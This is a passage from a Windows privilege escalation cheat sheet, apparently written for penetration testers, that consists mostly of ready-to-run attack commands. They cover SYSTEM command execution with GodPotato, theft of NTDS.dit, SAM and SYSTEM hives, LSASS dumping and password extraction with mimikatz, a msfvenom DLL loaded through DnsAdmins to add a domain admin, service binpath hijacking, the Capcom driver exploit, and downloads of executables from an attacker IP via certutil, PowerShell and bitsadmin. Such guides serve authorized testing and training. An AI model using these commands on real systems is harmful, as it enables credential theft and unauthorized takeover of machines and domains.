GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "net localgroup administrators YOUR_USER /add"
```

### SeBackupPrivilege

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
```

### SeDebugPrivilege

```batch
:: LSASS dump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

:: Mimikatz
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

### SeTakeOwnershipPrivilege

```batch
takeown /f "C:\Path\To\Protected\File"
icacls "C:\Path\To\Protected\File" /grant YOUR_USER:F
```

## 8.6 Group Privilege Abuse

### Backup Operators

```powershell
# Enable privilege
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege

# Copy protected files
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SAM C:\temp\SAM
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

### DnsAdmins

```batch
:: Generate DLL
msfvenom -p windows/x64/exec cmd='net group "domain admins" YOUR_USER /add /domain' -f dll -o adduser.dll

:: Load DLL
dnscmd.exe /config /serverlevelplugindll C:\Path\To\adduser.dll

:: Restart DNS
sc stop dns
sc start dns
```

### Server Operators

```batch
:: Modify service
sc config AppReadiness binpath= "cmd /c net localgroup Administrators YOUR_USER /add"
sc stop AppReadiness
sc start AppReadiness
```

### Print Operators

```batch
:: Load vulnerable driver
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
EnableSeLoadDriverPrivilege.exe
ExploitCapcom.exe
```

## 8.7 File Transfer Methods

```batch
:: Certutil
certutil -urlcache -f http://10.10.14.5/file.exe C:\temp\file.exe

:: PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/file.exe','C:\temp\file.exe')"
powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.5/file.exe' -OutFile 'C:\temp\file.exe'"

:: Bitsadmin
bitsadmin /transfer job /download /priority high http://10.10.14.5/file.exe C:\temp\file.exe

:: SMB (no HTTP needed)
copy \\10.10.14.5\share\file.exe C:\temp\file.exe
```

## 8.8 Common SID Reference

| SID | Name |
|-----|------|
| S-1-5-18 | NT AUTHORITY\SYSTEM |
| S-1-5-19 | NT AUTHORITY\LOCAL SERVICE |
| S-1-5-20 | NT AUTHORITY\NETWORK SERVICE |
| S-1-5-32-544 | BUILTIN\Administrators |
| S-1-5-32-545 | BUILTIN\Users |
| S-1-5-32-551 | BUILTIN\Backup Operators |
| S-1-5-32-555 | BUILTIN\Remote Desktop Users |
| S-1-1-0 | Everyone |
| S-1-5-11 | Authenticated Users |

## 8.9 CMD vs PowerShell Equivalents

| Task | CMD | PowerShell |
|------|-----|------------|
| Current user | `whoami` | `whoami` or `[Security.Principal.WindowsIdentity]::GetCurrent().Name` |
| List files | `dir` | `Get-ChildItem` or `ls` |
| File content | `type file.txt` | `Get-Content file.txt` or `cat file.txt` |
| Search files | `dir /s /b *.txt` | `Get-ChildItem -Recurse -Include *.txt` |
| Search content | `findstr /si password *.txt` | `Select-String -Path *.txt -Pattern password` |
| Process list | `tasklist` | `Get-Process` |
| Service list | `sc query` | `Get-Service` |
| Network connections | `netstat -ano` | `Get-NetTCPConnection` |
| Environment vars | `set` | `Get-ChildItem Env:` |
| Registry query | `reg query HKLM\...` | `Get-ItemProperty "HKLM:\..."` |

---

## References and Tools

| Resource | URL |
|----------|-----|
| WinPEAS | https://github.com/carlospolop/PEASS-ng |
| Seatbelt | https://github.com/GhostPack/Seatbelt |
| SharpUp | https://github.com/GhostPack/SharpUp |
| PowerUp | https://github.com/PowerShellMafia/PowerSploit |
| PrivescCheck | https://github.com/itm4n/PrivescCheck |
| PrintSpoofer | https://github.com/itm4n/PrintSpoofer |
| GodPotato | https://github.com/BeichenDream/GodPotato |
| Mimikatz | https://github.com/gentilkiwi/mimikatz |
| Impacket | https://github.com/SecureAuthCorp/impacket |
| LaZagne | https://github.com/AlessandroZ/LaZagne |
| SessionGopher | https://github.com/Arvanaghi/SessionGopher |
| Watson | https://github.com/rasta-mouse/Watson |
| LOLBins | https://lolbas-project.github.io |
| HackTricks Windows | https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |

---

*This guide represents the state of Windows privilege escalation techniques as of December 2025. Always verify techniques in a controlled environment before use in production assessments. Ensure proper authorization before testing any systems.*
